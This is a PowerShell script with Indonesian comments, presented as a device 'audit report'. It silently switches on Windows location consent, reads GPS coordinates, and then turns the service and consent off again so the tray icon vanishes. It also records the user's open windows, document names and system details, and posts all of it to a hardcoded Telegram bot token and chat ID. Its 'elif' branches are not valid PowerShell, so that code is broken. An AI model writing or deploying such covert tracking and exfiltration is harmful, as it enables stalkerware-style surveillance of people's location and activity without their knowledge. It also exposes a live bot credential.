# --- KONFIGURASI TELEGRAM ---
$TelegramToken = "8717446156:AAGhWMtcY1HgArk-aVZCEXj1aco7E6FEBhY"
$TelegramChatID = "1229343863"

# --- [ON] AKTIFKAN PRIVASI & SERVICE LOKASI ---
try {
    $RegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Privacy"
    if (-not (Test-Path $RegistryPath)) { New-Item -Path $RegistryPath -Force -ErrorAction SilentlyContinue }
    Set-ItemProperty -Path $RegistryPath -Name "LocationIconStatus" -Value 0 -ErrorAction SilentlyContinue
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" -Name "Value" -Value "Allow" -ErrorAction SilentlyContinue
    
    # Pastikan Service Jalan
    $LocationService = Get-Service -Name "lfsvc" -ErrorAction SilentlyContinue
    if ($LocationService.Status -ne 'Running') { 
        Start-Service -Name "lfsvc" -ErrorAction SilentlyContinue 
    }
} catch {}

# --- CEK KONEKSI TELEGRAM ---
function Test-TelegramAccess {
    try {
        $tcpClient = New-Object System.Net.Sockets.TcpClient
        $connect = $tcpClient.BeginConnect("api.telegram.org", 443, $null, $null)
        if ($connect.AsyncWaitHandle.WaitOne(2000, $false)) {
            $tcpClient.EndConnect($connect); $tcpClient.Close(); return $true
        }
        return $false
    } catch { return $false }
}
if (-not (Test-TelegramAccess)) { exit }

# --- PENGUMPULAN DATA AUDIT ---
$Hostname = $env:COMPUTERNAME
$SN = (Get-CimInstance Win32_Bios -ErrorAction SilentlyContinue).SerialNumber

# A. Windows Update
try {
    $WinUpdate = Get-CimInstance Win32_QuickFixEngineering | Sort-Object InstalledOn -Descending | Select-Object -First 1
    $LastWinUpdate = if ($WinUpdate.InstalledOn) { $WinUpdate.InstalledOn.ToString("dd MMM yyyy") } else { "N/A" }
} catch { $LastWinUpdate = "N/A" }

# B. Defragment
try {
    $DefragLog = Get-WinEvent -FilterHashtable @{LogName='Application'; ID=258} -MaxEvents 1 -ErrorAction SilentlyContinue
    $LastDefrag = if ($DefragLog) { $DefragLog.TimeCreated.ToString("dd MMM yyyy") } else { "N/A" }
} catch { $LastDefrag = "N/A" }

# C. Antivirus (Fix Date Format)
try {
    $AVQuery = Get-CimInstance -Namespace "root\SecurityCenter2" -Class "AntiVirusProduct" -ErrorAction SilentlyContinue
    $SelectedAV = $AVQuery | Where-Object { $_.displayName -like "*Kaspersky*" } | Select-Object -First 1
    
    if ($SelectedAV) {
        $AVName = $SelectedAV.displayName
        # Konversi format GMT/String ke dd MMM yyyy
        $RawTS = $SelectedAV.timestamp
        if ($RawTS -as [DateTime]) {
            $LastAVUpdate = ([DateTime]$RawTS).ToString("dd MMM yyyy")
        } else {
            $LastAVUpdate = (Get-Date).ToString("dd MMM yyyy")
        }
    } else {
        $AVName = "Windows Defender"
        $LastAVUpdate = (Get-MpComputerStatus).AntivirusSignatureLastUpdated.ToString("dd MMM yyyy")
    }
} catch { 
    $AVName = "N/A"; $LastAVUpdate = "N/A" 
}

# D. Resource Usage
$CPU = [Math]::Round((Get-Counter '\Processor(_Total)\% Processor Time' -SampleInterval 1 -MaxSamples 1).CounterSamples.CookedValue, 1)
$RAM = Get-CimInstance Win32_OperatingSystem
$RAMUsage = [Math]::Round((($RAM.TotalVisibleMemorySize - $RAM.FreePhysicalMemory) / $RAM.TotalVisibleMemorySize) * 100, 1)
$DiskUsage = [Math]::Round((Get-Counter '\LogicalDisk(C:)\% Disk Time' -MaxSamples 1).CounterSamples.CookedValue, 1)
if ($DiskUsage -gt 100) { $DiskUsage = 100 }

# E. Battery (Improved Detection)
try {
    # Coba ambil data baterai dengan prioritas Win32_Battery
    $Battery = Get-CimInstance Win32_Battery -ErrorAction SilentlyContinue
    
    if ($Battery) {
        $Charge = $Battery.EstimatedChargeRemaining
        # Jika nilai Charge kosong, coba ambil dari BatteryStatus (beberapa driver laptop berbeda)
        if ($null -eq $Charge) { 
            $Charge = (Get-WmiObject -Class BatteryStatus -Namespace root\wmi -ErrorAction SilentlyContinue).RemainingCapacity 
        }
        
        $Status = if ($Battery.BatteryStatus -eq 2) { "🔌 Charging" } else { "🔋 Discharging" }
        $BatteryString = "$Charge% ($Status)"
    } else {
        # Fallback kedua: Cek via WMI Power Management jika CIM gagal
        $WmiBat = Get-WmiObject -Class Win32_Battery -ErrorAction SilentlyContinue
        if ($WmiBat) {
            $Status = if ($WmiBat.BatteryStatus -eq 2) { "🔌 Charging" } else { "🔋 Discharging" }
            $BatteryString = "$($WmiBat.EstimatedChargeRemaining)% ($Status)"
        } else {
            $BatteryString = "Desktop (No Battery)"
        }
    }
} catch { 
    $BatteryString = "Battery Error" 
}

# F. Disk Report
$DiskReport = ""
foreach ($Drive in "C:", "D:", "E:" , "F:", "G:") {
    $D = Get-CimInstance Win32_LogicalDisk -Filter "DeviceID='$Drive'" -ErrorAction SilentlyContinue
    if ($D) {
        $P = [Math]::Round(($D.FreeSpace / $D.Size) * 100, 1)
        $Icon = if ($P -lt 10) { "🔴" } else { "🟢" }
        $DiskReport += "$Icon *$Drive* $([Math]::Round($D.FreeSpace / 1GB, 1)) GB / $([Math]::Round($D.Size / 1GB, 1)) GB ($P%)`n"
    }
}

# G. Network & GPU
$Net = Get-Counter '\Network Interface(*)\Bytes Total/sec' -ErrorAction SilentlyContinue
$NetUsage = [Math]::Round(($Net.CounterSamples.CookedValue | Measure-Object -Sum).Sum / 1KB, 1)
try { $GPUUsage = [Math]::Round(((Get-Counter '\GPU Engine(*)\Utilization Percentage' -ErrorAction SilentlyContinue).CounterSamples.CookedValue | Measure-Object -Sum).Sum, 1) } catch { $GPUUsage = 0 }

# H. Uptime & User
$Uptime = (Get-Date) - $RAM.LastBootUpTime
$UptimeString = "{0} Hari, {1} Jam, {2} Menit" -f $Uptime.Days, $Uptime.Hours, $Uptime.Minutes
$User = if ($Expl = Get-CimInstance Win32_Process -Filter "Name='explorer.exe'") { (Invoke-CimMethod -InputObject $Expl[0] -MethodName GetOwner).User } else { $env:USERNAME }

# --- DATA LOKASI ---
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.Device -ErrorAction SilentlyContinue
$Watcher = New-Object System.Device.Location.GeoCoordinateWatcher(1)
$Watcher.Start()

$MaxWait = 0
while ($MaxWait -lt 50) { 
    if (-not $Watcher.Position.Location.IsUnknown -and $Watcher.Position.Location.HorizontalAccuracy -le 200) { break }
    Start-Sleep -Milliseconds 100
    $MaxWait++
}

$Location = $Watcher.Position.Location
$Watcher.Stop() # Berhenti ambil koordinat

# --- [OFF] MATIKAN SERVICE LOKASI & PRIVACY SEGERA ---
try {
    # Paksa Stop Service agar icon di tray mati
    Stop-Service -Name "lfsvc" -Force -ErrorAction SilentlyContinue
    # Set Registry kembali ke Deny agar icon benar-benar hilang
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location" -Name "Value" -Value "Deny" -ErrorAction SilentlyContinue
} catch {}

# --- DETEKSI AKTIVITAS USER (SYSTEM SESSION-AWARE VERSION) ---
$CurrentActivity = "• No Active GUI Window"

try {
    $ValidApps = New-Object System.Collections.ArrayList

    # 1. BLACKLIST UTAMA: Saring proses sistem inti yang terkadang bocor ke Session 1
    $OsBlacklist = "^(Idle|System|SecureSystem|Secure System|Registry|Memory\sCompression|MemoryCompression|vmmem|explorer|svchost|lsass|csrss|wininit|services|spoolsv|SearchHost|StartMenuExperienceHost|RuntimeBroker|ShellExperienceHost|WmiPrvSE|conhost|dllhost|igfx.*|nv.*|ServiceHub.*|SearchIndexer|SearchApp|JavaService|AcroCEF|javaw|TextInputHost|klnagent|avp|dwm|ALEService|MuMuVMMHeadless|MuMuNxDevice|MuMuNxMain|LockApp|sihost|Widgets|CrossDeviceResume|SenaryAudioApp|ctfmon|smartscreen|taskhostw|SecurityHealthService|USOClient)$"

    # 2. Ambil semua proses yang AKTIF DI LAYAR USER (SessionId > 0)
    # Ini adalah kunci utama agar skrip yang dijalankan oleh SYSTEM tetap bisa menangkap aplikasi user!
    $AllProcesses = Get-Process -ErrorAction SilentlyContinue | Where-Object { 
        $_.SessionId -gt 0 -and $_.ProcessName -notmatch $OsBlacklist
    }

    # 3. Periksa aktivitas proses satu per satu
    foreach ($Proc in $AllProcesses) {
        try {
            $AppName = $Proc.Description
            if ([string]::IsNullOrWhiteSpace($AppName)) {
                $AppName = $Proc.ProcessName
            }

            # JALUR UTAMA: Deteksi visual Window Handle (Jika dijalankan interaktif/Admin)
            $HasWindow = $Proc.MainWindowHandle
            $Title = $Proc.MainWindowTitle

            if ($HasWindow -and $HasWindow -ne 0 -and $HasWindow -ne [IntPtr]::Zero -and (-not [string]::IsNullOrWhiteSpace($Title))) {
                
                $ContextTitle = $Title
                if ($Proc.ProcessName -eq "OUTLOOK") {
                    $ContextTitle = $Title -replace " - Outlook", ""
                }

                $TempObj = [PSCustomObject]@{
                    Name  = $AppName
                    Title = $ContextTitle
                }
                [void]$ValidApps.Add($TempObj)
            } 
            # JALUR CADANGAN: DIEKSEKUSI OLEH SYSTEM (Membaca proses Session 1 tanpa limitasi RAM)
            else {
                $ContextInfo = "Aplikasi Aktif"
                
                # Berikan label pintar untuk aplikasi kerja umum yang sudah kita ketahui
                if ($Proc.ProcessName -match "excel|winword|powerpnt|notepad") {
                    try {
                        $CmdLine = (Get-CimInstance Win32_Process -Filter "ProcessId = $($Proc.Id)" -ErrorAction SilentlyContinue).CommandLine
                        if ($CmdLine -and $CmdLine -match '"([^"\\]+\.[a-z0-9]+)"\s*$' -or $CmdLine -match '([^\\]+\.[a-z0-9]+)"*\s*$') {
                            $ContextInfo = "File: $($Matches[1] -replace '[\*\_`\[\]\(\)]', '')"
                        } else {
                            $ContextInfo = "Dokumen Terbuka"
                        }
                    } catch { $ContextInfo = "Dokumen Terbuka" }
                }
                elif ($Proc.ProcessName -eq "OUTLOOK") { $ContextInfo = "Email Active" }
                elif ($Proc.ProcessName -match "^(chrome|msedge|brave|firefox)$") { $ContextInfo = "Browser Aktif" }
                elif ($Proc.ProcessName -match "msedgewebview2|msteams|M365Copilot|LenovoVantage") { $ContextInfo = "Layanan Latar Belakang" }
                elif ($Proc.ProcessName -eq "mstsc") { $ContextInfo = "Remote Desktop Aktif" }
                elif ($Proc.ProcessName -match "powershell") { $ContextInfo = "Konsol PowerShell" }
                elif ($Proc.ProcessName -match "whatsapp") { $ContextInfo = "WhatsApp Messenger" }
                elif ($Proc.ProcessName -eq "anydesk") { $ContextInfo = "Remote Akses" }
                elif ($Proc.ProcessName -eq "LockoutStatus") { $ContextInfo = "Audit Lockout User" }
                elif ($Proc.ProcessName -eq "Taskmgr") { $ContextInfo = "Windows Task Manager" }
                elif ($Proc.ProcessName -eq "Acrobat") { $ContextInfo = "Membuka Dokumen PDF" }
                elif ($Proc.ProcessName -match "MuMuPlayer") { $ContextInfo = "Emulator Android Aktif" }
                elif ($Proc.ProcessName -match "forticlient|fortisslvpnclient") {
                    $VpnAdapter = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object { $_.InterfaceDescription -match "Fortinet|Forti" -and $_.Status -eq "Up" }
                    $ContextInfo = if ($VpnAdapter) { "VPN Connected" } else { "VPN Disconnected" }
                }
                else {
                    # Otomatis menangkap aplikasi ilegal / tidak terdaftar yang dibuka user
                    $ContextInfo = "Proses Tidak Terdaftar"
                }

                $TempObj = [PSCustomObject]@{
                    Name  = $AppName
                    Title = $ContextInfo
                }
                [void]$ValidApps.Add($TempObj)
            } 
        } catch { continue } 
    } 

    # 4. KONSOLIDASI LOGIKA (ANTI-DUPLIKAT & DISPLAY)
    if ($ValidApps.Count -gt 0) {
        $GroupedApps = $ValidApps | Group-Object Name
        $AppLines = @()

        foreach ($Group in $GroupedApps) {
            $BestRecord = $Group.Group | Where-Object { $_.Title -notmatch "^(Aplikasi Aktif|Browser Aktif|Email Active|Layanan Latar Belakang|Dokumen Terbuka|Remote Desktop Aktif|Konsol PowerShell|WhatsApp Messenger|Remote Akses|Audit Lockout User|Windows Task Manager|Membuka Dokumen PDF|VPN Connected|VPN Disconnected|Emulator Android Aktif|Proses Tidak Terdaftar)$" } | Select-Object -First 1
            
            if (-not $BestRecord) {
                $BestRecord = $Group.Group | Select-Object -First 1
            }

            $CleanAppName = $BestRecord.Name
            $CleanTitle   = $BestRecord.Title

            # Sanitisasi String Murni
            $DangerousChars = @('*', '_', '`', '[', ']', '(', ')', '#', '-')
            foreach ($Char in $DangerousChars) {
                $CleanAppName = $CleanAppName.Replace($Char, '')
                if ($CleanTitle) { $CleanTitle = $CleanTitle.Replace($Char, '') }
            }

            if ($CleanTitle.Length -gt 40) { $CleanTitle = $CleanTitle.Substring(0, 37) + "..." }

            $AppLines += "• $CleanAppName ($CleanTitle)"
        } 

        $CurrentActivity = ($AppLines | Sort-Object) -join "`n"
    } else {
        $CurrentActivity = "• No Active GUI Window"
    }

} catch { $CurrentActivity = "• Debug: $($_.Exception.Message)" }

# --- LOGIKA TAMPILAN LOKASI ---
if (!$Location.IsUnknown) {
    $Lat = $Location.Latitude.ToString().Replace(",", ".")
    $Lon = $Location.Longitude.ToString().Replace(",", ".")
    $Acc = [Math]::Round($Location.HorizontalAccuracy, 2)
    $MapsLink = "https://www.google.com/maps?q=$Lat,$Lon"
} else {
    $Acc = "Approx (Sensor Off)"
    $MapsLink = "Location Disabled"
}

# --- PESAN (SUSUNAN TETAP) ---
$Timestamp = Get-Date -Format "yyyy-MM-dd | HH:mm:ss"
$Message = "📍 *AUDIT DEVICE REPORT*`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "💻 *Hostname:* $Hostname`n" +
           "🔢 *Serial Number:* $SN`n" +
           "👤 *User:* $User`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "📊 *RESOURCE USAGE:*`n" +
           "📟 *CPU:* $CPU % | *⚡ *RAM:* $RAMUsage %`n" +
           "📁 *Disk:* $DiskUsage % | *🎨 *GPU:* $GPUUsage %`n" +
           "🔋 *Battery:* $BatteryString`n" +
           "📶 *Network:* $NetUsage Kbps`n" +
           "⏱️ *Uptime:* $UptimeString`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "🖱️ *Active App: *`n$CurrentActivity`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "💾 *SPACE STORAGE STATUS:*`n$DiskReport" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "⚙️ *PM STATUS:*`n" +
           "🛡️ *AV:* $AVName`n" +
           "📅 *AV Update:* $LastAVUpdate`n" +
           "🔄 *Win Update:* $LastWinUpdate`n" +
           "🧹 *Last Defrag:* $LastDefrag`n" +
           "🎯 *Location Accuracy:* $Acc meter`n" +
           "⏰ *Report Sent:* $Timestamp`n" +
           "━━━━━━━━━━━━━━━━━━`n" +
           "🔗 [GMAPS - Device Location]($MapsLink)"

# --- PENGIRIMAN ---
try {
    $Payload = @{ chat_id = $TelegramChatID; text = $Message; parse_mode = "Markdown" }
    Invoke-RestMethod -Uri "https://api.telegram.org/bot$($TelegramToken)/sendMessage" -Method Post -Body $Payload -TimeoutSec 10
} catch {}
